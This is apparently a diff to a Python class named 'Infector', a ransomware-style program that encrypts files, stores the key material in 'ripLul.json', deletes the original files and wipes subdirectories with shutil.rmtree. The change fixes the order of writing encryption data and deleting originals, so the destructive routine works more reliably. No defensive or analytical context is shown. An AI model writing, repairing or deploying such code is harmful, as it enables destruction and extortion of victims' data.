@@ -34,11 +34,11 @@ class Infector:
                     
                     jData = json.dumps({'RSACipher': rsa2ascii, 'CT': ct2ascii, 'IV': iv2ascii, 'TAG': tag2ascii, 'EXT': EXT})
 
-                    os.remove(os.path.join(root,file))
                     # Writing encryption data to JSON file
-                    with open('ripLul.json', 'w') as jFile:    
+                    with open(os.path.join(root, 'ripLul.json'), 'a') as jFile:    
                         jFile.write(jData)
-                        jFile.close()
+                    os.remove(os.path.join(root,file))
+                    
             for dir in dirs:
                 shutil.rmtree(os.path.join(root, dir), ignore_errors=True)
 
